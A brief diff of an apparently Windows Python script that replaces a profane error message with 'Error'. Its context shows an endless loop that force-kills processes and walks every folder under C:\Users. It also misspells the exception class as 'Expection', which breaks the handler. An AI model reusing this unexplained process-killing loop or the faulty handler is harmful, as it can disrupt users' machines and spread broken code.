@@ -14,7 +14,7 @@ while True:
                 print(proc.name().lower())
                 proc.kill()
             except Expection as e:
-                print('Blyat', e)
+                print('Error', e)
 
     for user in os.listdir(r'C:\Users'):
         p = f"C:\\Users\\{user}"
